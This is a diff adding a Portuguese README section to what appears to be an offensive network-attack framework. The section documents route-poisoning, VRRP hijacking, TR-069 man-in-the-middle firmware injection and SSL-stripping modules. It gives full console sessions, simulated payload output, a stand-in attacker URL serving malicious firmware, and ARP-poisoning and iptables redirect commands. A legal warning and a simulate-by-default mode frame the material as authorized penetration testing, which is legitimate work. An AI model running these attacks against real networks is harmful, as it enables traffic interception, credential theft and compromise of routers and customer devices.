@@ -143,6 +143,112 @@ Consulte [docs/wiki/pt-BR/12-scripts-nse.md](docs/wiki/pt-BR/12-scripts-nse.md) 
 
 ---
 
+## BLOCO J - Categorias de Ataque (v2.0.0)
+
+> **AVISO LEGAL:** Todos os modulos desta secao sao destinados **exclusivamente a testes de seguranca autorizados, pesquisa e uso educacional**. A execucao contra firewalls ou roteadores em producao sem autorizacao expressa e por escrito configura crime federal. Os autores e a Uniao Geek nao assumem responsabilidade por uso indevido.
+
+### Ataques de Roteamento
+
+> **AVISO:** Ataques de injecao de rota redirecionam trafego de rede e podem interromper a seguranca de perimetro e os servicos em producao. Apenas para laboratorio autorizado.
+
+```bash
+fxf > use exploits/routing/rip_v1_poison
+fxf (RIPv1Poison) > set src_ip 192.168.1.100
+fxf (RIPv1Poison) > set poison_network 0.0.0.0
+fxf (RIPv1Poison) > set metric 1
+fxf (RIPv1Poison) > set destination 255.255.255.255
+fxf (RIPv1Poison) > set simulate true
+fxf (RIPv1Poison) > run
+
+[SIMULATE] Enviaria RIPv1 Response para 255.255.255.255:520
+[SIMULATE] Rede: 0.0.0.0 (rota padrao) metrica=1 next-hop=192.168.1.100
+[SIMULATE] Payload (24 bytes): 0201000000020000...
+[SIMULATE] Explora CVE-1999-0111: RIPv1 nao possui autenticacao
+[SIMULATE] Efeito: roteadores sem autenticacao instalam rota padrao via atacante
+[!] Set simulate false + destructive true para executar
+```
+
+```bash
+fxf > use exploits/routing/vrrp_hijack
+fxf (VRRPHijack) > set src_ip 192.168.1.100
+fxf (VRRPHijack) > set vrid 1
+fxf (VRRPHijack) > set virtual_ip 192.168.1.1
+fxf (VRRPHijack) > set priority 255
+fxf (VRRPHijack) > set simulate true
+fxf (VRRPHijack) > run
+
+[SIMULATE] Enviaria 5 Advertisement(s) VRRP
+[SIMULATE]   VRID=1 prioridade=255 virtual_ip=192.168.1.1 advert_int=1s
+[SIMULATE]   src=192.168.1.100 -> dst=224.0.0.18 (IP proto 112)
+[SIMULATE]   Payload VRRP (16 bytes): 21012001...
+[SIMULATE] Efeito: master VRRP atual cede; atacante torna-se roteador ativo para 192.168.1.1
+[!] PRE-REQUISITO: Scapy + privilegios de raw socket (root Linux) ou admin Windows
+```
+
+| Modulo | Caminho | Impacto | Referencia |
+|--------|---------|---------|-----------|
+| `rip_v1_poison` | `exploits/routing/` | ALTO | CVE-1999-0111, RFC 1058 |
+| `vrrp_hijack` | `exploits/routing/` | ALTO | RFC 3768, MITRE T1557 |
+
+### Proxies MiTM
+
+> **AVISO:** Modulos de proxy MiTM interceptam e potencialmente modificam o trafego de gerenciamento de dispositivos de rede. Podem expor credenciais e permitir alteracoes de configuracao nao autorizadas. Requer ARP poisoning como pre-requisito.
+
+```bash
+fxf > use exploits/mitm/tr069_mitm_proxy
+fxf (TR069MiTM) > set acs_host 10.0.0.1
+fxf (TR069MiTM) > set acs_port 7547
+fxf (TR069MiTM) > set listen_port 7547
+fxf (TR069MiTM) > set inject_mode firmware
+fxf (TR069MiTM) > set firmware_url http://atacante/firmware-malicioso.bin
+fxf (TR069MiTM) > set simulate true
+fxf (TR069MiTM) > run
+
+[SIMULATE] Ligaria proxy CWMP em 0.0.0.0:7547
+[SIMULATE]   ACS upstream: 10.0.0.1:7547 (ssl=False)
+[SIMULATE]   Modo de injecao: inject Download RPC para http://atacante/firmware-malicioso.bin
+[SIMULATE] Configuracao necessaria:
+[SIMULATE]   1. ARP poison no CPE para redirecionar porta 7547 ao atacante
+[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 7547 -j REDIRECT --to-port 7547
+[!] Set simulate false + destructive true para iniciar o proxy
+```
+
+```bash
+fxf > use exploits/mitm/ssl_strip_embedded
+fxf (SSLStrip) > set target 192.168.1.1
+fxf (SSLStrip) > set target_port 443
+fxf (SSLStrip) > set listen_port 10080
+fxf (SSLStrip) > set simulate true
+fxf (SSLStrip) > run
+
+[SIMULATE] Ligaria proxy SSL strip em 0.0.0.0:10080
+[SIMULATE]   Alvo upstream: 192.168.1.1:443 (use_ssl_upstream=True)
+[SIMULATE]   Todas as referencias HTTPS convertidas para HTTP nas respostas
+[SIMULATE]   Credenciais, cookies e headers de autorizacao registrados em texto simples
+[SIMULATE] Configuracao necessaria:
+[SIMULATE]   1. ARP poison no alvo: arp -s <ip_alvo> <mac_atacante>
+[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10080
+[!] Set simulate false + destructive true para iniciar o proxy
+```
+
+| Modulo | Caminho | Impacto | Referencia |
+|--------|---------|---------|-----------|
+| `tr069_mitm_proxy` | `exploits/mitm/` | CRITICO | TR-069 Amendment 6, CVE-2014-9222 |
+| `ssl_strip_embedded` | `exploits/mitm/` | ALTO | BlackHat DC 2009 (Marlinspike), MITRE T1557.002 |
+
+### Resumo de Cobertura
+
+| Categoria | Modulos | Modo Padrao |
+|-----------|---------|------------|
+| Ataques de Roteamento | `rip_v1_poison`, `vrrp_hijack` | simulate=True |
+| Proxies MiTM | `tr069_mitm_proxy`, `ssl_strip_embedded` | simulate=True |
+| Exploits de Perimetro | `fortios_sslvpn_session_reuse`, `cisco_asa_ftd_firestarter_chain`, + 10+ | simulate=True |
+| Credenciais | `perimeter_auth_bruteforce` | simulate=True |
+
+Todos os modulos utilizam `simulate=True` por padrao. A execucao ao vivo requer `destructive=True` definido explicitamente apos revisar a saida simulada.
+
+---
+
 ## Licença
 
 BSD — ver [LICENSE](LICENSE).
